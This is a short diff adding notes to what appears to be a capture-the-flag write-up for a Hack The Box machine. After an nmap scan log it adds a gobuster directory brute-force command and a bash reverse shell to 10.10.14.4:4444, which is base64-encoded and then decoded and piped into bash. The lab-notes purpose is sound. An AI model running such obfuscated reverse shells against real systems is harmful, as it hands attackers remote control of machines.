@@ -34,3 +34,10 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 31.93 seconds
 ```
+
+
+
+./go/bin/gobuster dir -u http://eforenzics.htb -w ~/gobuster-dir/dsstorewordlist.txt
+
+echo 'bash -i >& /dev/tcp/10.10.14.4/4444 0>&1' | base64
+echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0NDQgMD4mMQo='|base64 -d|bash|
